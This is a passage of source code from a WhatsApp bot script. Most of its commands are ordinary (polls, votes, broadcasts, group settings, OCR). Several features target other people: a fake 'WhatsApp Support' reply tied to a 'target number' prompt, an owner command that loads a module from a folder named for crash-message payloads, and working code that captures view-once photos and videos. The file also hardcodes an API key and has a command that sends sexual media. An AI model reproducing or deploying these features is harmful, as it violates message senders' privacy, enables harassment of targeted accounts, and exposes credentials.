replydare(`##- WhatsApp Support -##

It looks like you are using or asking a question about an unofficial version of WhatsApp.

To ensure you have access to WhatsApp, re-verify your phone number using our official app which can be downloaded from our website: www.whatsapp.com/download

Unofficial apps compromise your security and safety, and we do not support them.

Here's what might happen if you use it:

There is no guarantee that your messages or data such as your location or files you share will be private and secure.

Accounts may be blocked due to use of unauthorized WhatsApp applications contrary to our Terms of Service.

Following are WhatsApp's terms of service:

WhatsApp Terms of Service

1. Application Usage

You agree to use the WhatsApp application ("Application") only for lawful purposes and in accordance with applicable law. You are not permitted to use the Application for illegal purposes or to violate third party rights. You also agree not to use the Application to send, receive, or store information that violates the law or violates third party rights.

2. Copyright and Trademark

You agree that all copyrights, trademarks and other proprietary rights related to the Application are owned by WhatsApp, Inc. and/or its affiliates. You are not permitted to use or modify any copyright, trademark or other proprietary rights without the written permission of WhatsApp, Inc. or its affiliates.

3. Data Privacy and Security
WhatsApp promises to protect your privacy and data security. We will process your data in accordance with our Privacy Policy which can be accessed at https://www.whatsapp.com/legal/#privacy-policy. By using the Application, you agree to our Privacy Policy and provide your consent to process your data in accordance with our Privacy Policy. 

4. Limitation of Liability 
WhatsApp is not responsible for any losses caused by the use of the Application by you or other third parties, including but not limited to losses caused by technical failure or equipment damage, data loss, property damage, or other financial losses. 

5. Changes to Terms of Service 
WhatsApp reserves the right to change these Terms of Service at any time without prior notice. By continuing to use the Application after changes to these Terms of Service become effective, you agree to be bound by the most current version of these Terms of Service.`)
} else if (payload.includes(`"payload":false`)) {
replydare(`##- WhatsApp Support -##

Thank you for contacting us. We will contact you back by email, and that may take up to three business days.`)
} else replydare(util.format(res.data))
} catch (err) {replydare(`${err}`)}
} else replydare('Enter target number!')
}
break

//=================={{=[===================]]\\

case 'santet' : case '🌷' : case '🐲': case '🐉': case '🌵': case '🎄': case '🌲': case '🌳': case '🌱': case '🌿': case '🍀': case '☘️': {
 if (!DareTheCreator) return reply(mess.only.owner)
const { xeonorwot } = require('./virtex/xeonbut2')
let reactionMessage = proto.Message.ReactionMessage.create({ key: m.key, text: "" })
Dare.relayMessage(m.chat, { reactionMessage }, { messageId: '🦄' })
}
break
//=================={{=[===================]]\\
case 'tourl': {
  if (!isMedia) return replydare("Where Is The Media?");
  let media = await Dare.downloadAndSaveMediaMessage(quoted);
  let mediaUrl = await handleMediaUpload(m, mime);  // Call the media upload function

  if (mediaUrl.startsWith("http")) {  // If media was successfully uploaded
    replydare('Url : ' + mediaUrl);  // Reply with the media URL
  } else {
    replydare(mediaUrl);  // If the response was an error message
  }
}
break;
//=================================================================
case 'carimusik': {
if (!quoted) return replydare(`where's the music?`)
const media = await Dare.downloadAndSaveMediaMessage(quoted)
	let anuu = await TelegraPh (media)
	const crii = await fetchJson(`https://api.lolhuman.xyz/api/musicsearch?apikey=efcb180d3fd3134748648887&file=${anuu}`);
	reply(`Status: success\n*Judul* : ${crii.result.title}\n*Album* : ${crii.result.album}\n`)
}
break
//=================================================================
case 'ocr': {
  if (!quoted) return replydare(`mana fotonya kak?`)
  reply(mess.wait)
  const media = await Dare.downloadAndSaveMediaMessage(quoted)
	let anuu = await TelegraPh (media)
	const data = await fetchJson(`https://api.lolhuman.xyz/api/ocr?apikey=efcb180d3fd3134748648887&img=${anuu}`)
	const textnya = data.result
	reply(`${textnya}`)
}
break
case 'tozombie':
case 'jadizombie': {
  if (!quoted) return replydare(`where's the photo bro?`)
  reply(mess.wait)
  const media = await Dare.downloadAndSaveMediaMessage(quoted)
	let anuu = await TelegraPh (media)
	const data = await fetchJson(`https://itzpire.com/tools/jadizombie?url=${anuu}`)
	const zombie = data.result
	Dare.sendMessage(m.chat, { image: { url: zombie }, caption: `_Making Success ${command}_`}, { quoted: m})
}
break
case 'show':
case 'vv':
case 'readviewonce': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
	if (!m.quoted) return replydare(`Reply to view the message once`)
	if (m.quoted.mtype !== 'viewOnceMessageV2') return replydare(`This is not a view once message`)
    let msg = m.quoted.message
    let type = Object.keys(msg)[0]
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return Dare.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
    } else if (/image/.test(type)) {
        return Dare.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
    }
}
break
case 'vv2':
case 'wow': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
	if (!m.quoted) return replydare(`Reply to view the message once`)
	if (m.quoted.mtype !== 'viewOnceMessageV2') return replydare(`This is not a view once message`)
    let msg = m.quoted.message
    let type = Object.keys(msg)[0]
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return Dare.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
    } else if (/image/.test(type)) {
        return Dare.sendFile(Dare.user.id, buffer, 'media.jpg', msg[type].caption || '', m)
    }
}
break
case 'join': {
if (!DareTheCreator) return reply(mess.only.owner)
if (!text) return replydare(`Example ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replydare('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await Dare.groupAcceptInvite(result)
await replydare(`Done`)
}
break
case 'poll': {
	if (!DareTheCreator) return reply(mess.only.owner)
            let [poll, opt] = text.split("|")
            if (text.split("|") < 2)
return await replydare(
`Please state the question and at least 2 choices\nExample: ${prefix}poll Who is the best admin?|Dare,Asep,Doge...`
)
            let options = []
            for (let i of opt.split(',')) {
options.push(i)
            }
            await Dare.sendMessage(m.chat, {
poll: {
name: poll,
values: options
}
            })
        }
        break
        case 'vote': {
            if (!m.isGroup) return reply(mess.only.group)
            if (m.chat in vote) return replydare(`_There are still votes in this chat!_\n\n*${prefix}deletevote* - to delete votes`)
            if (!text) return replydare(`Enter Reason for Choosing, Example: *${prefix + command} Handsome Owner*`)
            replydare(`Voting begins!\n\n*${prefix}upvote* - to upvote\n*${prefix}downvote* - to downvote\n*${prefix}checkvote* - to check votes\n*${prefix} deletevote* - to delete votes`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

Please Type Below
*${prefix}upvote* - to cast vote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            Dare.sendMessage(m.chat, {text: teks_vote}, {quoted:m})
	    }
            break
               case 'upvote': {
            if (!m.isGroup) return reply(mess.only.group)
            if (!(m.chat in vote)) return replydare(`_*tidak ada voting di grup ini!*_\n\n*${prefix}vote* - untuk memulai voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return replydare('You have Voted')
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            Dare.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	    }
             break
case 'downvote': {
            if (!m.isGroup) return reply(mess.only.group)
            if (!(m.chat in vote)) return replydare(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return replydare('You have Voted')
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            Dare.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	}
            break
 
case 'checkvote':
if (!m.isGroup) return reply(mess.only.group)
if (!(m.chat in vote)) return replydare(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}deletevote* - to delete votes


©${Dare.user.id}
`
Dare.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'deletevote': case 'delvote': case 'hapusvote': {
            if (!m.isGroup) return reply(mess.only.group)
            if (!(m.chat in vote)) return replydare(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            delete vote[m.chat]
            replydare('Successfully Deleted Vote Session In This Group')
	    }
            break
case 'tovv': case 'toviewonce': { 
if (!quoted) return replydare(`Reply Image/Video`)
reply(mess.wait)
if (/image/.test(mime)) {
anuan = await Dare.downloadAndSaveMediaMessage(quoted)
Dare.sendMessage(m.chat, {image: {url:anuan}, caption: `𝐁𝐌𝐁 🙂`, fileLength: "999", viewOnce : true},{quoted: m })
} else if (/video/.test(mime)) {
anuanuan = await Dare.downloadAndSaveMediaMessage(quoted)
Dare.sendMessage(m.chat, {video: {url:anuanuan}, caption: `𝐁𝐌𝐁 🙂`, fileLength: "99999999", viewOnce : true},{quoted: m })
}
}
break
case 'fliptext': {
if (args.length < 1) return replydare(`Example:\n${prefix}fliptext ${ownername}`)
quere = args.join(" ")
flipe = quere.split('').reverse().join('')
replydare(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
}
break
case 'paptt': {
 if (!isPrem) return replyprem(mess.premium)
global.paptt = [
 "https://telegra.ph/file/5c62d66881100db561c9f.mp4",
 "https://telegra.ph/file/a5730f376956d82f9689c.jpg",
 "https://telegra.ph/file/8fb304f891b9827fa88a5.jpg",
 "https://telegra.ph/file/0c8d173a9cb44fe54f3d3.mp4",
 "https://telegra.ph/file/b58a5b8177521565c503b.mp4",
 "https://telegra.ph/file/34d9348cd0b420eca47e5.jpg",
 "https://telegra.ph/file/73c0fecd276c19560133e.jpg",
 "https://telegra.ph/file/af029472c3fcf859fd281.jpg",
 "https://telegra.ph/file/0e5be819fa70516f63766.jpg",
 "https://telegra.ph/file/29146a2c1a9836c01f5a3.jpg",
 "https://telegra.ph/file/85883c0024081ffb551b8.jpg",
 "https://telegra.ph/file/d8b79ac5e98796efd9d7d.jpg",
 "https://telegra.ph/file/267744a1a8c897b1636b9.jpg",
 ]
	let url = paptt[Math.floor(Math.random() * paptt.length)]
	Dare.sendFile(m.chat, url, null, 'Tch, youre so horny', m)
}
break
 case 'alkitab':
case 'bible2':{ 
     if (!text) return reply( `uhm.. where is the text?\n\nexample:\n${prefix + command} incident`)
     let res = await axios.get(`https://alkitab.me/search?q=${encodeURIComponent(text)}`, { headers: { "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" } }) 
  
     let $ = cheerio.load(res.data) 
     let result = [] 
     $('div.vw').each(function (a, b) { 
         let teks = $(b).find('p').text().trim() 
         let link = $(b).find('a').attr('href') 
         let title = $(b).find('a').text().trim() 
         result.push({ teks, link, title }) 
     }) 
 
   let foto = 'https://telegra.ph/file/a333442553b1bc336cc55.jpg'
   let judul = '*────────「 Bible 」 ────────*'
     let caption = result.map(v => `💌 ${v.title}\n📮 ${v.teks}`).join('\n┄┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┄\n') 
      Dare.sendFile(m.chat, foto, 'alkitab.jpg', `${judul}\n\n${caption}`, m)
 } 
break
            case 'listpc': {
 let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
 let teks = `${themeemoji} *PERSONAL CHAT LIST*\n\nTotal Chat : ${anulistp.length} Chat\n\n`
 for (let i of anulistp) {
 let nama = store.messages[i].array[0].pushName
 teks += `${themeemoji} *Name :* ${nama}\n${themeemoji} *User :* @${i.split('@')[0]}\n${themeemoji} *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
 }
 Dare.sendTextWithMentions(m.chat, teks, m)
             }
             break
case 'listgc': {
 let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
 let teks = `${themeemoji} *GROUP CHAT LIST*\n\nTotal Group : ${anulistg.length} Group\n\n`
 for (let i of anulistg) {
 let metadata = await Dare.groupMetadata(i)
 teks += `${themeemoji} *Name :* ${metadata.subject}\n${themeemoji} *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}\n${themeemoji} *ID :* ${metadata.id}\n${themeemoji} *Made :* ${moment(metadata.creation * 1000).tz('Africa/Lagos').format('DD/MM/YYYY HH:mm:ss')}\n${themeemoji} *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
 }
 Dare.sendTextWithMentions(m.chat, teks, m)
             }
             break
             case 'ping2': case 'botstatus': case 'statusbot': {
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
replydare(respon)
            }
            break
            case 'bctext': case 'broadcasttext': case 'broadcast': {
			    if (!DareTheCreator) return reply(mess.only.owner)
		            if (!q) return replydare(`Enter text`)
		        const data = await store.chats.all()
        for (let i of data) {
           Dare.sendMessage(i.id, {text: `${ownername}'s Broadcast\n\nMessage : ${q}` })
           await sleep(1000)
        }
        }
        break
        case 'broadcastimage': case 'bcimage': case 'broadcastvideo': case 'broadcastvid':
if(!DareTheCreator) return reply(mess.only.owner)
        if (!q) return replydare(`Enter text`)
        let getGroups = await Dare.groupFetchAllParticipating()
        let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
        let xeoncast = groups.map(v => v.id)
        replydare(` Post in ${xeoncast.length} Group Chat, in ${xeoncast.length * 1,5} seconds`)
        for (let i of xeoncast) {
let txt = `${ownername}'s Broadcast\n\nMessage : ${q}`
if(/image/.test(mime)) {
let media = await quoted.download()
await Dare.sendMessage(i, { image:media,  caption: txt,mentions:participants.map(a => a.id) })
}
if(/video/.test(mime)){
let media = await quoted.download()
await Dare.sendMessage(i, { video:media,  caption: txt, mentions:participants.map(a => a.id) })
}
            }
        replydare(`Broadcast Successfully in Group ${xeoncast.length}`)      
        break
case 'block': case 'ban': {
		if (!DareTheCreator) return reply(mess.only.owner)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await Dare.updateBlockStatus(users, 'block')
		await replydare(`Done`)
	}
	break
        case 'unblock': case 'unban': {
		if (!DareTheCreator) return reply(mess.only.owner)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await Dare.updateBlockStatus(users, 'unblock')
		await replydare(`Done`)
	}
	break
case 'listblock': case 'listban': case 'blocklist': case 'banlist': {
	const lisben = "Total Block: " + banUser.length
	replydare(lisben)
	}
	break

case 'resetlinkgc':
case 'resetlinkgroup':
case 'resetlinkgrup':
case 'revoke':
case 'resetlink':
case 'resetgrouplink':
case 'resetgclink':
case 'resetgruplink': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bots Must Become Admins First_')
if (!isAdmins && !DareTheCreator) return reply('Admin only!!')
Dare.groupRevokeInvite(m.chat)
}
break
            case 'react': {
if (!DareTheCreator) return reply(mess.only.owner)
reactionMessage = {
react: {
    text: args[0],
    key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
}
}
Dare.sendMessage(m.chat, reactionMessage)
            }
            break
case 'group': case 'gc': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !DareTheCreator) return reply('Admin only!!')
if (!isBotAdmins) return reply('_Bots Should Be Admins First_')
if (!q) return replydare(`Send orders ${command} _options_\nOptions : close & open\nExample : ${command} close`)
if (args[0] == 'close') {
  reply(`*₊˚🗝 ࣪𓂃˚☽ ｡⋆ . . .  「 _it's time_ ${botname} close the group 〞*

     ♡゙. . .Namaste˚☽˚｡⋆
 ━ ━༝ ₊˚good night/morning everyoneﾟ｡𓊇
· · • • • 🪷 • • • ·`)
Dare.groupSettingUpdate(from, 'announcement')
} else if (args[0] == 'open') {
  reply(`*₊˚🗝 ࣪𓂃˚☽ ｡⋆ . . .  「 _hello everyone ,it's time to open_ 〞*

     ♡゙. . .Come on, Deploy 𝐃𝐀𝐑𝐄-𝐕𝟑 𝐁𝐎𝐓, hehe
type *.menu* to see the bot list˚☽˚｡⋆
 ━ ━༝ ₊˚ check script : ${saluran} ﾟ｡𓊇
· · • • • 🪷 • • • ·`)
Dare.groupSettingUpdate(from, 'not_announcement')
} else {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hey ${pushname}\nPlease click the button below to use _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: Dare.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"SELECT OPEN/CLOSE ♨️",
                "sections":[{
                  "title":"SELECT OPEN/CLOSE ",
                  "rows":[{
                    "header":"OPEN 🙂",
                    "title":"CHOOSE ",
                    "description":"OPEN🙂",
                    "id":"${prefix + command} open"
                  },
                  {
                    "header":"CLOSED ❌",
                    "title":"CHOOSE ",
                    "description":"CLOSED ❌",
                    "id":"${prefix + command} close"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '100000000000000000@newsletter',
            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });

await Dare.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
}}
break
case 'autostickergc':
            case 'autosticker':
if (!isAdmins && !DareTheCreator) return reply('Admin only!!')
if (args.length < 1) return replydare('type auto sticker on to enable\ntype auto sticker off to disable')
if (args[0]  === 'on'){
if (isAutoSticker) return replydare(`Already activated`)
autosticker.push(from)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
replydare('autosticker activated')
} else if (args[0] === 'off'){
let anuticker1 = autosticker.indexOf(from)
autosticker.splice(anuticker1, 1)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
replydare('auto sticker deactivated')
}
break
case 'antivirus': case 'antivirtex': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bots Must Become Admins First_')
if (!isAdmins && !DareTheCreator) return reply('Admin only!!')
if (args[0] === "on") {
if (antiVirtex) return replydare('Already activated')
ntvirtex.push(from)
fs.writeFileSync('./database/antivirus.json', JSON.stringify(ntvirtex))
replydare('Success in turning on antivirus in this group')
var groupe = await Dare.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Dare.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNo body is allowed to send virus in this group, member who send will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiVirtex) return replydare('Already deactivated')
let off = ntvirtex.indexOf(from)
ntvirtex.splice(off, 1)
fs.writeFileSync('./database/antivirus.json', JSON.stringify(ntvirtex))
replydare('Success in turning off antivirus this group')
} else {
  let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hey ${pushname}\nPlease click the button below to use _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: Dare.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"SELECT ON/OFF ♨️",
                "sections":[{
                  "title":"SELECT ON/OFF ",
                  "rows":[{
                    "header":"TURN IT ON 🙂",
                    "title":"CHOOSE ",
                    "description":"ON 🙂",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"DEADLY ❌",
                    "title":"CHOOSE ",
                    "description":"DEADLY ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '100000000000000000@newsletter',
            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });

await Dare.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
case 'nsfw': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bots Should Be Admins First_')
if (!isAdmins && !DareTheCreator) return reply('Admin only!!')
if (args[0] === "on") {
if (AntiNsfw) return replydare('Already activated')
ntnsfw.push(from)
fs.writeFileSync('./database/nsfw.json', JSON.stringify(ntnsfw))
replydare('Success in turning on nsfw in this group')
var groupe = await Dare.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Dare.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNsfw(not safe for work) feature has been enabled in this group, which means one can access sexual graphics from the bot!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiNsfw) return replydare('Already deactivated')
let off = ntnsfw.indexOf(from)
ntnsfw.splice(off, 1)
fs.writeFileSync('./database/nsfw.json', JSON.stringify(ntnsfw))
replydare('Success in turning off nsfw in this group')
} else {
  let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hey ${pushname}\nPlease click the button below to use _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: Dare.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"SELECT ON/OFF ♨️",
                "sections":[{
                  "title":"SELECT ON/OFF ",
                  "rows":[{
                    "header":"TURN IT ON 🙂",
                    "title":"CHOOSE ",
                    "description":"ON 🙂",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"DEADLY ❌",
                    "title":"CHOOSE ",
                    "description":"DEADLY ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '100000000000000000@newsletter',
            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });

await Dare.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
  case 'antilinkyoutubevideo': case 'antilinkyoutubevid': case 'antilinkytvid': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bots Must Become Admins First_')
if (!isAdmins && !DareTheCreator) return reply('Admin only!!')
if (args[0] === "on") {
if (AntiLinkYoutubeVid) return replydare('Already activated')
ntilinkytvid.push(from)
fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
replydare('Success in turning on youtube video antilink in this group')
var groupe = await Dare.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Dare.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube video link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeVid) return replydare('Already deactivated')
let off = ntilinkytvid.indexOf(from)
ntilinkytvid.splice(off, 1)
fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
replydare('Success in turning off youtube video antilink in this group')
} else {
  let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hey ${pushname}\nPlease click the button below to use _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: Dare.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"SELECT ON/OFF ♨️",
                "sections":[{
                  "title":"SELECT ON/OFF ",
                  "rows":[{
                    "header":"TURN IT ON 🙂",
                    "title":"CHOOSE ",
                    "description":"ON 🙂",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"DEADLY ❌",
                    "title":"CHOOSE ",
                    "description":"DEADLY ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '100000000000000000@newsletter',
